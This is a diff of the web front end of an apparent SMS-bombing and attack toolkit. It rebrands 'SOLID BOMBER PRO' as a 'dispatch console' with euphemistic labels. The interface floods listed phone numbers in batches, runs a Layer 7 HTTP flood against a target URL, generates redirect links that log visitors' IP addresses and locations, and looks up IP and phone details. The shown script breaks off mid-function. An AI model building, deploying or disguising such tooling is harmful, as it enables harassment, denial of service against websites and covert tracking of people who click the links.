@@ -3,628 +3,620 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SOLID BOMBER PRO - DASHBOARD</title>
+    <title>+Nine-11 | DISPATCH CONSOLE</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.0/font/bootstrap-icons.css">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@300;500;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;500;700&family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
     <style>
         :root {
-            --bg-dark: #020617;
-            --card-bg: rgba(15, 23, 42, 0.95);
-            --ph-blue: #0038A8;
-            --ph-red: #CE1126;
-            --ph-yellow: #FCD116;
-            --ph-white: #FFFFFF;
-            --accent: var(--ph-yellow);
-            --text-primary: #f8fafc;
-            --text-secondary: #cbd5e1;
-            --success: #22c55e;
-            --danger: #ef4444;
+            --bg-body: #050505;
+            --bg-panel: #0a0a0a;
+            --bg-sidebar: #080808;
+            --accent: #00f2ff;
+            --success: #00ff41;
+            --danger: #ff3e3e;
+            --warning: #ffcc00;
+            --text-main: #e0e0e0;
+            --text-muted: #888;
+            --border: #222;
         }
 
         body {
-            background-color: var(--bg-dark);
-            background-image: 
-                radial-gradient(circle at 10% 20%, rgba(0, 56, 168, 0.2) 0%, transparent 40%),
-                radial-gradient(circle at 90% 80%, rgba(206, 17, 38, 0.2) 0%, transparent 40%);
-            color: var(--text-primary);
-            font-family: 'Rajdhani', sans-serif;
-            min-height: 100vh;
-            overflow-x: hidden;
-            font-size: 1.1rem;
+            background-color: var(--bg-body);
+            color: var(--text-main);
+            font-family: 'JetBrains Mono', monospace;
+            height: 100vh;
+            overflow: hidden;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
         }
 
-        h1, h2, h3, h4, h5, .navbar-brand {
+        /* --- Header --- */
+        .header {
+            background: var(--bg-panel);
+            border-bottom: 1px solid var(--border);
+            padding: 10px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            z-index: 100;
+        }
+
+        .brand {
             font-family: 'Orbitron', sans-serif;
-            letter-spacing: 2px;
+            color: var(--accent);
+            font-size: 1.2rem;
             font-weight: 700;
+            display: flex;
+            align-items: center;
+            gap: 10px;
         }
 
-        .navbar {
-            background: rgba(2, 6, 23, 0.98);
-            backdrop-filter: blur(10px);
-            border-bottom: 2px solid var(--ph-blue);
-            box-shadow: 0 4px 30px rgba(0, 56, 168, 0.4);
-            padding: 1rem 0;
+        .status-indicators {
+            display: flex;
+            gap: 20px;
+            font-size: 0.8rem;
+            color: var(--text-muted);
         }
 
-        .navbar-brand img {
-            width: 45px;
-            height: 45px;
-            filter: drop-shadow(0 0 8px var(--ph-yellow));
-            margin-right: 15px;
+        .status-item span {
+            color: var(--accent);
+            margin-left: 5px;
         }
 
-        .card {
-            background: var(--card-bg);
-            border: 2px solid rgba(148, 163, 184, 0.15);
-            border-radius: 20px;
-            backdrop-filter: blur(15px);
-            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.6);
+        /* --- Main Layout --- */
+        .app-container {
+            display: flex;
+            flex: 1;
+            overflow: hidden;
         }
 
-        .card:hover {
-            border-color: var(--ph-blue);
-            transform: translateY(-5px);
-            box-shadow: 0 15px 50px rgba(0, 56, 168, 0.25);
+        .sidebar {
+            width: 240px;
+            background: var(--bg-sidebar);
+            border-right: 1px solid var(--border);
+            display: flex;
+            flex-direction: column;
+            padding: 20px 0;
         }
 
-        .stats-card {
-            background: linear-gradient(135deg, #1e293b, #0f172a);
+        .nav-item {
+            padding: 15px 25px;
+            color: var(--text-muted);
+            cursor: pointer;
+            transition: 0.2s;
+            border-left: 3px solid transparent;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 0.9rem;
+        }
+
+        .nav-item:hover {
+            background: rgba(0, 242, 255, 0.05);
+            color: var(--text-main);
+        }
+
+        .nav-item.active {
+            background: rgba(0, 242, 255, 0.1);
+            color: var(--accent);
+            border-left-color: var(--accent);
+        }
+
+        /* --- Content Area --- */
+        .content-area {
+            flex: 1;
+            padding: 30px;
+            overflow-y: auto;
             position: relative;
-            z-index: 1;
         }
 
-        .stats-card::before {
-            content: "";
-            position: absolute;
-            inset: 0;
-            border-radius: 20px;
-            padding: 2px;
-            background: linear-gradient(45deg, var(--ph-blue), var(--ph-red));
-            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
-            -webkit-mask-composite: xor;
-            mask-composite: exclude;
-            opacity: 0.5;
+        .module-card {
+            background: var(--bg-panel);
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            padding: 25px;
+            max-width: 900px;
+            margin: 0 auto;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
         }
 
-        .btn-primary {
-            background: linear-gradient(90deg, var(--ph-blue), #0056e6, var(--ph-blue));
-            background-size: 200% auto;
-            border: none;
+        .module-header {
+            border-bottom: 1px solid var(--border);
+            padding-bottom: 15px;
+            margin-bottom: 25px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .module-title {
             font-family: 'Orbitron', sans-serif;
-            font-weight: 700;
+            font-size: 1.1rem;
+            color: var(--accent);
             text-transform: uppercase;
-            letter-spacing: 2px;
-            padding: 16px 32px;
-            border-radius: 12px;
-            transition: 0.5s;
-            box-shadow: 0 4px 20px rgba(0, 56, 168, 0.5);
         }
 
-        .btn-primary:hover {
-            background-position: right center;
-            box-shadow: 0 8px 25px rgba(0, 56, 168, 0.7);
-            transform: scale(1.02);
-        }
-
+        /* --- Inputs --- */
+        .form-label { color: var(--text-muted); font-size: 0.8rem; text-transform: uppercase; }
         .form-control, .form-select {
-            background-color: rgba(2, 6, 23, 0.8);
-            border: 2px solid rgba(148, 163, 184, 0.2);
-            color: white;
-            border-radius: 12px;
-            padding: 15px;
-            font-size: 1.1rem;
-            transition: all 0.3s;
+            background: #111;
+            border: 1px solid #333;
+            color: #fff;
+            font-family: 'JetBrains Mono', monospace;
+            border-radius: 2px;
+            padding: 10px;
         }
-
         .form-control:focus {
-            background-color: #000;
-            border-color: var(--ph-yellow);
-            box-shadow: 0 0 15px rgba(252, 209, 22, 0.2);
+            background: #151515;
+            border-color: var(--accent);
+            box-shadow: 0 0 0 0.25rem rgba(0, 242, 255, 0.1);
+            color: #fff;
         }
 
-        #log-container {
-            height: 300px;
-            font-size: 1rem;
-            line-height: 1.5;
-            border: 2px solid rgba(0, 56, 168, 0.4);
-        }
-
-        .log-entry {
-            font-weight: 500;
-            padding: 8px 12px;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
-        }
-
-        /* Target Intel Badge */
-        .intel-badge {
-            background: rgba(15, 23, 42, 0.9);
-            border: 1px solid var(--ph-blue);
-            border-radius: 10px;
-            padding: 10px 15px;
-            margin-top: 10px;
-            display: none;
-            animation: fadeIn 0.3s;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(-10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        /* Realistic Rocket Animation */
-        .rocket-container {
-            position: fixed;
-            bottom: -100px;
-            left: 50%;
-            transform: translateX(-50%);
-            z-index: 10001;
-            pointer-events: none;
-            display: none;
-        }
-
-        .rocket-body {
-            width: 40px;
-            height: 80px;
-            background: #e2e8f0;
-            border-radius: 50% 50% 10% 10%;
+        /* --- Buttons --- */
+        .btn-dispatch {
+            background: transparent;
+            border: 1px solid var(--accent);
+            color: var(--accent);
+            border-radius: 2px;
+            padding: 12px 25px;
+            text-transform: uppercase;
+            font-weight: 700;
+            transition: 0.3s;
             position: relative;
-            box-shadow: inset -5px 0 10px rgba(0,0,0,0.2);
+            overflow: hidden;
+        }
+        .btn-dispatch:hover {
+            background: var(--accent);
+            color: #000;
+        }
+        .btn-stop {
+            border-color: var(--danger);
+            color: var(--danger);
+        }
+        .btn-stop:hover {
+            background: var(--danger);
+            color: #fff;
         }
 
-        .rocket-body::before { /* Nose cone */
-            content: "";
-            position: absolute;
-            top: -20px;
-            left: 0;
-            width: 40px;
-            height: 30px;
-            background: var(--ph-red);
-            clip-path: polygon(50% 0%, 0% 100%, 100% 100%);
-        }
-
-        .rocket-fin-l, .rocket-fin-r {
+        /* --- Terminal Logs --- */
+        .terminal-container {
             position: absolute;
             bottom: 0;
-            width: 20px;
-            height: 30px;
-            background: var(--ph-blue);
-        }
-        .rocket-fin-l { left: -15px; clip-path: polygon(100% 0, 0 100%, 100% 100%); }
-        .rocket-fin-r { right: -15px; clip-path: polygon(0 0, 0 100%, 100% 100%); }
-
-        .rocket-flame {
-            position: absolute;
-            bottom: -40px;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 20px;
-            height: 40px;
-            background: linear-gradient(to bottom, #f59e0b, #ef4444, transparent);
-            border-radius: 0 0 50% 50%;
-            animation: flicker 0.1s infinite;
-        }
-
-        @keyframes flicker {
-            0%, 100% { height: 40px; opacity: 1; }
-            50% { height: 35px; opacity: 0.8; }
-        }
-
-        @keyframes launch-realistic {
-            0% { bottom: -100px; transform: translateX(-50%) scale(1); }
-            20% { bottom: 20px; transform: translateX(-50%) scale(1.1); }
-            100% { bottom: 80%; transform: translateX(-50%) scale(0.5); opacity: 0; }
-        }
-
-        #log-container::-webkit-scrollbar { width: 6px; }
-        #log-container::-webkit-scrollbar-thumb { background: var(--ph-blue); border-radius: 10px; }
-
-        .log-entry {
-            margin-bottom: 6px;
-            padding: 4px 8px;
-            border-radius: 4px;
-            background: rgba(255, 255, 255, 0.03);
-            border-left: 3px solid transparent;
-        }
-
-        .log-success { color: #4ade80; border-left-color: #4ade80; }
-        .log-error { color: #f87171; border-left-color: #f87171; }
-        .log-info { color: #60a5fa; border-left-color: #60a5fa; }
-
-        .badge-online {
-            background: rgba(74, 222, 128, 0.1);
-            color: #4ade80;
-            border: 1px solid #4ade80;
-            padding: 5px 12px;
-            border-radius: 20px;
-            font-size: 0.75rem;
-            text-transform: uppercase;
-            font-weight: 700;
-            animation: pulse 2s infinite;
-        }
-
-        @keyframes pulse {
-            0% { box-shadow: 0 0 0 0 rgba(74, 222, 128, 0.4); }
-            70% { box-shadow: 0 0 0 10px rgba(74, 222, 128, 0); }
-            100% { box-shadow: 0 0 0 0 rgba(74, 222, 128, 0); }
-        }
-
-        /* Explosion Canvas */
-        #explosion-canvas {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            z-index: 9999;
-        }
-
-        .rocket-anim {
-            display: inline-block;
-            animation: launch 1s ease-in-out infinite alternate;
-        }
-
-        @keyframes launch {
-            from { transform: translateY(0); }
-            to { transform: translateY(-5px); }
-        }
-
-        .footer {
-            margin-top: 50px;
-            padding: 30px 0;
-            border-top: 1px solid rgba(148, 163, 184, 0.1);
-        }
-
-        .ph-accent-line {
-            height: 3px;
-            width: 100%;
-            background: linear-gradient(to right, var(--ph-blue) 33%, var(--ph-white) 33% 66%, var(--ph-red) 66%);
-            position: fixed;
-            top: 0;
-            z-index: 10000;
-        }
-        
-        .textarea-container {
-            position: relative;
-        }
-        
-        .textarea-container::after {
-            content: 'Multiple numbers supported (comma/newline)';
-            position: absolute;
-            bottom: -20px;
+            left: 240px;
             right: 0;
-            font-size: 0.7rem;
-            color: var(--text-secondary);
+            height: 200px;
+            background: #000;
+            border-top: 2px solid var(--border);
+            padding: 10px;
+            font-size: 0.8rem;
+            overflow-y: auto;
+            z-index: 50;
         }
+        .log-entry { margin-bottom: 4px; }
+        .log-time { color: #555; margin-right: 10px; }
+        .log-info { color: var(--success); }
+        .log-warn { color: var(--warning); }
+        .log-error { color: var(--danger); }
+
+        /* --- Rocket Animation --- */
+        #rocket-container {
+            position: fixed;
+            bottom: -100px;
+            right: 50px;
+            width: 60px;
+            transition: bottom 2s cubic-bezier(0.47, 0, 0.745, 0.715);
+            z-index: 1000;
+            pointer-events: none;
+        }
+        .rocket-svg { width: 100%; height: auto; transform: rotate(-45deg); }
+
+        /* --- Uptime Meter --- */
+        .uptime-meter {
+            width: 15px;
+            height: 15px;
+            border-radius: 50%;
+            display: inline-block;
+            margin-right: 10px;
+        }
+        .uptime-online { background: var(--success); box-shadow: 0 0 10px var(--success); }
+        .uptime-offline { background: var(--danger); box-shadow: 0 0 10px var(--danger); }
+
+        /* --- Tabs --- */
+        .module-tab { display: none; }
+        .module-tab.active { display: block; }
     </style>
 </head>
 <body>
-    <div class="ph-accent-line"></div>
-    <canvas id="explosion-canvas"></canvas>
 
-    <!-- Realistic Rocket -->
-    <div class="rocket-container" id="rocket">
-        <div class="rocket-body">
-            <div class="rocket-fin-l"></div>
-            <div class="rocket-fin-r"></div>
-            <div class="rocket-flame"></div>
+    <header class="header">
+        <div class="brand">
+            <i class="bi bi-shield-lock-fill"></i>
+            +Nine-11 <span style="font-size: 0.7rem; color: #555;">v2.0.0-PRO</span>
         </div>
-    </div>
+        <div class="status-indicators">
+            <div class="status-item">NET: <span id="ind-net">STABLE</span></div>
+            <div class="status-item">SIG: <span id="ind-sig">ENCRYPTED</span></div>
+            <div class="status-item">CPU: <span id="ind-cpu">0.1%</span></div>
+        </div>
+        <div>
+            <button class="btn btn-sm btn-outline-danger" onclick="stopCurrentOp()" id="btn-stop-global" style="display: none;">
+                <i class="bi bi-x-circle-fill"></i> ABORT OPERATION
+            </button>
+        </div>
+    </header>
 
-    <nav class="navbar navbar-expand-lg mb-5">
-        <div class="container">
-            <a class="navbar-brand fw-bold text-white d-flex align-items-center" href="#">
-                <img src="/static/logo.png" alt="Logo">
-                <span>SOLID BOMBER <span style="color: var(--ph-blue)">PRO</span></span>
-            </a>
-            <div class="d-flex align-items-center">
-                <span class="badge-online"><i class="bi bi-broadcast me-2"></i>SYS_ACTIVE</span>
+    <div class="app-container">
+        <aside class="sidebar">
+            <div class="nav-item active" data-tab="tab-bomber">
+                <i class="bi bi-broadcast-pin"></i> SIGNAL DISPATCH
             </div>
-        </div>
-    </nav>
+            <div class="nav-item" data-tab="tab-flood">
+                <i class="bi bi-graph-up-arrow"></i> STRESS ANALYSIS
+            </div>
+            <div class="nav-item" data-tab="tab-tracker">
+                <i class="bi bi-geo-alt-fill"></i> LOCATION VERIFY
+            </div>
+            <div class="nav-item" data-tab="tab-osint">
+                <i class="bi bi-search"></i> INTEL INQUIRY
+            </div>
+        </aside>
 
-    <div class="container">
-        <div class="row g-4">
-            <!-- Attack Control -->
-            <div class="col-lg-7">
-                <div class="card p-4 h-100">
-                    <div class="d-flex justify-content-between align-items-center mb-4">
-                        <h5 class="m-0 text-white"><i class="bi bi-rocket-takeoff-fill me-2 text-warning"></i>COMMAND CENTER</h5>
-                        <span class="badge bg-primary">PRESTIGE V1.4.0</span>
+        <main class="content-area">
+            
+            <!-- SIGNAL DISPATCH MODULE -->
+            <div id="tab-bomber" class="module-tab active">
+                <div class="module-card">
+                    <div class="module-header">
+                        <div class="module-title">Signal Load Distribution</div>
+                        <span class="badge bg-primary">PH-REGION-CORE</span>
                     </div>
-                    <form id="attackForm">
-                        <div class="mb-4 textarea-container">
-                            <label class="form-label text-secondary small fw-bold uppercase">TARGET ACQUISITION</label>
-                            <textarea id="phone" class="form-control" rows="3" placeholder="09123456789, 09987654321" required></textarea>
-                            
-                            <!-- Intel Badge -->
-                            <div id="intel-badge" class="intel-badge">
-                                <div class="d-flex align-items-center justify-content-between">
-                                    <div class="small">
-                                        <i class="bi bi-cpu me-2 text-info"></i>CARRIER: <span id="intel-carrier" class="text-white fw-bold">...</span>
-                                    </div>
-                                    <div class="small">
-                                        <i class="bi bi-shield-lock me-2 text-warning"></i>STATUS: <span id="intel-status" class="text-white fw-bold">...</span>
-                                    </div>
-                                </div>
-                            </div>
+                    <div class="mb-4">
+                        <label class="form-label">Target Signal Nodes (Phone Numbers)</label>
+                        <textarea class="form-control" id="bomber-target" rows="3" placeholder="09xxxxxxxxx, 09xxxxxxxxx"></textarea>
+                        <div class="form-text text-muted mt-1">Separate multiple nodes by comma or newline.</div>
+                    </div>
+                    <div class="row mb-4">
+                        <div class="col-md-6">
+                            <label class="form-label">Signal Intensity (Batches)</label>
+                            <input type="number" class="form-control" id="bomber-amount" value="100">
                         </div>
-                        
-                        <div class="row mb-4">
-                            <div class="col-md-6">
-                                <label class="form-label text-secondary small fw-bold uppercase">ATTACK INTENSITY (BATCHES)</label>
-                                <div class="input-group">
-                                    <span class="input-group-text bg-dark border-secondary text-white"><i class="bi bi-speedometer2"></i></span>
-                                    <input type="number" id="amount" class="form-control" value="100" min="1" max="1000">
-                                </div>
-                            </div>
-                            <div class="col-md-6">
-                                <label class="form-label text-secondary small fw-bold uppercase">SELECT SERVICES</label>
-                                <select id="services" class="form-select" multiple style="height: 100px;">
-                                    <option value="all" selected>ALL SERVICES (MAX POWER)</option>
-                                    {% for service in services %}
-                                    <option value="{{ service.name }}">{{ service.name }}</option>
-                                    {% endfor %}
-                                </select>
-                            </div>
+                        <div class="col-md-6">
+                            <label class="form-label">Available Carriers</label>
+                            <select class="form-select" id="bomber-services" multiple style="height: 100px;">
+                                {% for service in services %}
+                                <option value="{{ service.name }}" selected>{{ service.name }}</option>
+                                {% endfor %}
+                            </select>
                         </div>
-
-                        <button type="submit" id="submitBtn" class="btn btn-primary w-100 py-3 mt-2">
-                            <i class="bi bi-lightning-charge-fill me-2"></i>INITIALIZE DEPLOYMENT
+                    </div>
+                    <div class="d-grid">
+                        <button class="btn-dispatch" id="btn-bomber-start" onclick="startBomber()">
+                            <i class="bi bi-play-fill"></i> INITIALIZE SIGNAL DISPATCH
                         </button>
-                    </form>
+                    </div>
                 </div>
             </div>
 
-            <!-- Stats & Logs -->
-            <div class="col-lg-5">
-                <div class="row g-3 mb-4">
-                    <div class="col-6">
-                        <div class="card p-4 text-center stats-card">
-                            <div class="stats-icon"><i class="bi bi-shield-check"></i></div>
-                            <h2 id="stat-success" class="fw-bold m-0">0</h2>
-                            <div class="text-secondary small fw-bold mt-1">SUCCESSFUL HITS</div>
+            <!-- STRESS ANALYSIS MODULE -->
+            <div id="tab-flood" class="module-tab">
+                <div class="module-card">
+                    <div class="module-header">
+                        <div class="module-title">Network Stress Analysis</div>
+                        <span class="badge bg-danger">LAYER 7</span>
+                    </div>
+                    <div class="mb-4">
+                        <label class="form-label">Target Resource URL</label>
+                        <input type="text" class="form-control" id="flood-url" placeholder="https://target-site.com">
+                    </div>
+                    <div class="row mb-4">
+                        <div class="col-md-6">
+                            <label class="form-label">Duration (Seconds)</label>
+                            <input type="number" class="form-control" id="flood-duration" value="60">
+                        </div>
+                        <div class="col-md-6">
+                            <label class="form-label">Concurrency (Workers)</label>
+                            <input type="number" class="form-control" id="flood-concurrency" value="30">
                         </div>
                     </div>
-                    <div class="col-6">
-                        <div class="card p-4 text-center">
-                            <div class="stats-icon" style="background: linear-gradient(to bottom, #fff, var(--ph-red)); -webkit-background-clip: text;"><i class="bi bi-shield-slash"></i></div>
-                            <h2 id="stat-failed" class="fw-bold m-0 text-danger">0</h2>
-                            <div class="text-secondary small fw-bold mt-1">BLOCKED/FAILED</div>
+                    <div class="mb-4">
+                        <div class="p-3 border border-dark rounded bg-dark d-flex align-items-center justify-content-between">
+                            <div>
+                                <span class="uptime-meter" id="uptime-dot"></span>
+                                <span id="uptime-text" class="text-muted">Target Status: WAITING</span>
+                            </div>
+                            <div class="text-accent" id="flood-packet-count">0 PPS</div>
+                        </div>
+                    </div>
+                    <div class="d-grid">
+                        <button class="btn-dispatch" id="btn-flood-start" onclick="startFlood()">
+                            <i class="bi bi-lightning-charge-fill"></i> EXECUTE STRESS ANALYSIS
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- LOCATION VERIFY MODULE -->
+            <div id="tab-tracker" class="module-tab">
+                <div class="module-card">
+                    <div class="module-header">
+                        <div class="module-title">Location Verification Service</div>
+                        <span class="badge bg-warning text-dark">TRACKING</span>
+                    </div>
+                    <div class="mb-4">
+                        <label class="form-label">Destination URL (Redirect)</label>
+                        <div class="input-group">
+                            <input type="text" class="form-control" id="tracker-target" value="https://google.com">
+                            <button class="btn btn-outline-info" onclick="generateLink()">GENERATE VERIFICATION LINK</button>
+                        </div>
+                    </div>
+                    <div id="generated-link-area" class="mb-4 d-none">
+                        <label class="form-label">Active Verification Link</label>
+                        <div class="input-group">
+                            <input type="text" class="form-control" id="generated-link" readonly>
+                            <button class="btn btn-primary" onclick="copyLink()">COPY</button>
+                        </div>
+                    </div>
+                    <div class="mt-4">
+                        <label class="form-label">Recent Verifications</label>
+                        <div class="table-responsive">
+                            <table class="table table-dark table-hover table-sm" style="font-size: 0.75rem;">
+                                <thead>
+                                    <tr>
+                                        <th>TIMESTAMP</th>
+                                        <th>IP ADDRESS</th>
+                                        <th>LOCATION</th>
+                                        <th>ISP</th>
+                                    </tr>
+                                </thead>
+                                <tbody id="tracker-logs-body">
+                                    <tr><td colspan="4" class="text-center text-muted">No data available</td></tr>
+                                </tbody>
+                            </table>
                         </div>
                     </div>
                 </div>
-                <div class="card p-4">
-                    <div class="d-flex justify-content-between align-items-center mb-3">
-                        <h6 class="m-0 fw-bold"><i class="bi bi-terminal me-2"></i>MISSION LOGS</h6>
-                        <button class="btn btn-sm btn-outline-secondary px-3" onclick="document.getElementById('log-container').innerHTML=''">CLEAR</button>
+            </div>
+
+            <!-- INTEL INQUIRY MODULE -->
+            <div id="tab-osint" class="module-tab">
+                <div class="module-card">
+                    <div class="module-header">
+                        <div class="module-title">Intelligence Database Inquiry</div>
+                        <span class="badge bg-info text-dark">OSINT</span>
                     </div>
-                    <div id="log-container">
-                        <div class="text-secondary opacity-50 small">Standing by for target acquisition...</div>
+                    <div class="row">
+                        <div class="col-md-6">
+                            <label class="form-label">IP Trace Inquiry</label>
+                            <div class="input-group">
+                                <input type="text" class="form-control" id="osint-ip" placeholder="8.8.8.8">
+                                <button class="btn btn-outline-accent" onclick="inquiryIP()">SEARCH</button>
+                            </div>
+                        </div>
+                        <div class="col-md-6">
+                            <label class="form-label">Carrier Logic Inquiry</label>
+                            <div class="input-group">
+                                <input type="text" class="form-control" id="osint-phone" placeholder="09xxxxxxxxx">
+                                <button class="btn btn-outline-accent" onclick="inquiryPhone()">SEARCH</button>
+                            </div>
+                        </div>
+                    </div>
+                    <div id="osint-result" class="mt-4 p-3 bg-dark border border-dark rounded d-none">
+                        <pre id="osint-result-pre" style="font-size: 0.8rem; color: var(--success); margin: 0;"></pre>
                     </div>
                 </div>
+            </div>
+
+        </main>
+
+        <div class="terminal-container" id="terminal">
+            <div class="log-entry">
+                <span class="log-time">[09:07:00]</span>
+                <span class="log-info">DISPATCH CONSOLE INITIALIZED. WAITING FOR COMMAND...</span>
             </div>
         </div>
     </div>
 
-    <footer class="footer text-center">
-        <div class="container">
-            <div class="mb-3">
-                <img src="/static/logo.png" width="30" height="30" class="opacity-50" alt="Footer Logo">
-            </div>
-            <div class="text-secondary small fw-bold">
-                SOLID BOMBER PRO | PRESTIGE EDITION | 
-                <a href="https://github.com/ccelda-4chan/911" class="text-ph-blue text-decoration-none mx-2">
-                    <i class="bi bi-github"></i> SOURCE
-                </a>
-            </div>
-            <div class="mt-2 text-secondary opacity-25" style="font-size: 0.6rem">
-                FOR EDUCATIONAL PURPOSES ONLY. THE DEVELOPER IS NOT RESPONSIBLE FOR MISUSE.
-            </div>
-        </div>
-    </footer>
+    <!-- ROCKET ANIMATION -->
+    <div id="rocket-container">
+        <svg class="rocket-svg" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M13.1118 14.7521L14.7331 13.1308M13.1118 14.7521L10.5118 12.1521M13.1118 14.7521C13.1118 14.7521 13.2359 16.4851 14.0044 17.2536C14.7729 18.0221 16.5059 18.1462 16.5059 18.1462L17.2147 16.1158C17.2147 16.1158 18.9142 16.0354 19.9822 15.1957C21.0502 14.356 21.0502 12.4354 21.0502 12.4354L19.0198 11.7266C19.0198 11.7266 18.8957 10.0354 18.0163 9.07635C17.1369 8.11727 15.3562 8.11727 15.3562 8.11727L14.7331 13.1308M14.7331 13.1308L18.1473 9.71659M10.5118 12.1521L12.1331 10.5308M10.5118 12.1521C10.5118 12.1521 8.77884 12.2762 8.01035 11.5077C7.24185 10.7392 7.11776 9.00624 7.11776 9.00624L9.14815 8.29746C9.14815 8.29746 9.22855 6.59795 10.0682 5.52994C10.9079 4.46194 12.8285 4.46194 12.8285 4.46194L13.5373 6.49233C13.5373 6.49233 15.2285 6.61642 16.1876 7.49583C17.1467 8.37524 17.1467 10.156 17.1467 10.156L12.1331 10.5308M12.1331 10.5308L15.5473 7.11659M11.697 19.125C11.697 19.125 10.0573 21.25 7.87201 21.25C5.68668 21.25 4.87201 20.4353 4.87201 18.25C4.87201 16.0647 7 14.425 7 14.425L7.25 17.25L10.0625 17.0625L11.697 19.125Z" stroke="var(--accent)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+    </div>
 
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
     <script>
-        const form = document.getElementById('attackForm');
-        const submitBtn = document.getElementById('submitBtn');
-        const logContainer = document.getElementById('log-container');
-        const successStat = document.getElementById('stat-success');
-        const failedStat = document.getElementById('stat-failed');
-        const canvas = document.getElementById('explosion-canvas');
-        const ctx = canvas.getContext('2d');
-        const rocket = document.getElementById('rocket');
-        const intelBadge = document.getElementById('intel-badge');
-        const phoneInput = document.getElementById('phone');
+        let currentStatusInterval = null;
+        let activeLinkID = null;
 
-        let isAttacking = false;
-
-        // Particle System for Explosion
-        let particles = [];
-        function initCanvas() {
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-        }
-        window.onresize = initCanvas;
-        initCanvas();
-
-        class Particle {
-            constructor(x, y, color) {
-                this.x = x;
-                this.y = y;
-                this.color = color;
-                this.size = Math.random() * 8 + 3;
-                this.speedX = (Math.random() - 0.5) * 20;
-                this.speedY = (Math.random() - 0.5) * 20;
-                this.gravity = 0.15;
-                this.opacity = 1;
-            }
-            update() {
-                this.x += this.speedX;
-                this.y += this.speedY;
-                this.speedY += this.gravity;
-                this.opacity -= 0.015;
-            }
-            draw() {
-                ctx.globalAlpha = this.opacity;
-                ctx.fillStyle = this.color;
-                ctx.beginPath();
-                ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
-                ctx.fill();
-            }
-        }
-
-        function createExplosion(x, y, power = 50) {
-            const colors = ['#0038A8', '#CE1126', '#FCD116', '#FFFFFF', '#f97316'];
-            for (let i = 0; i < power; i++) {
-                particles.push(new Particle(x, y, colors[Math.floor(Math.random() * colors.length)]));
-            }
-        }
-
-        function animateParticles() {
-            ctx.clearRect(0, 0, canvas.width, canvas.height);
-            for (let i = 0; i < particles.length; i++) {
-                particles[i].update();
-                particles[i].draw();
-                if (particles[i].opacity <= 0) {
-                    particles.splice(i, 1);
-                    i--;
-                }
-            }
-            requestAnimationFrame(animateParticles);
-        }
-        animateParticles();
-
-        // Phone Lookup Intelligence
-        let lookupTimer;
-        phoneInput.addEventListener('input', () => {
-            clearTimeout(lookupTimer);
-            const val = phoneInput.value.trim().split(/[,\n\s]+/)[0];
-            if (val.length >= 4) {
-                lookupTimer = setTimeout(async () => {
-                    try {
-                        const res = await fetch(`/lookup/${val}`);
-                        const data = await res.json();
-                        if (!data.error) {
-                            document.getElementById('intel-carrier').innerText = data.carrier;
-                            document.getElementById('intel-status').innerText = data.status;
-                            document.getElementById('intel-status').className = data.limited ? 'text-danger fw-bold' : 'text-success fw-bold';
-                            intelBadge.style.display = 'block';
-                        }
-                    } catch (e) { console.error(e); }
-                }, 500);
-            } else {
-                intelBadge.style.display = 'none';
-            }
+        // --- Navigation ---
+        document.querySelectorAll('.nav-item').forEach(item => {
+            item.addEventListener('click', () => {
+                document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
+                document.querySelectorAll('.module-tab').forEach(t => t.classList.remove('active'));
+                item.classList.add('active');
+                document.getElementById(item.dataset.tab).classList.add('active');
+            });
         });
 
+        // --- Logging ---
         function addLog(msg, type = 'info') {
+            const terminal = document.getElementById('terminal');
             const entry = document.createElement('div');
-            entry.className = `log-entry log-${type}`;
+            entry.className = 'log-entry';
             const time = new Date().toLocaleTimeString();
-            entry.innerHTML = `<span class="text-secondary small">[${time}]</span> ${msg}`;
-            logContainer.prepend(entry);
-            
-            if (type === 'success' || msg.includes('OK')) {
-                const rect = successStat.getBoundingClientRect();
-                createExplosion(rect.left + rect.width/2, rect.top + rect.height/2, 30);
-            }
+            entry.innerHTML = `<span class="log-time">[${time}]</span><span class="log-${type}">${msg}</span>`;
+            terminal.appendChild(entry);
+            terminal.scrollTop = terminal.scrollHeight;
         }
 
-        form.onsubmit = async (e) => {
-            e.preventDefault();
-            if (isAttacking) return;
-
-            const phone = phoneInput.value;
-            const amount = document.getElementById('amount').value;
-            const selectedOptions = Array.from(document.getElementById('services').selectedOptions).map(o => o.value);
-            const services = selectedOptions.includes('all') ? null : selectedOptions;
-
-            isAttacking = true;
-            submitBtn.disabled = true;
-            submitBtn.innerHTML = '<span class="spinner-border spinner-border-sm me-2"></span>CALIBRATING ROCKETS...';
-            
-            successStat.innerText = '0';
-            failedStat.innerText = '0';
-            logContainer.innerHTML = '';
-            
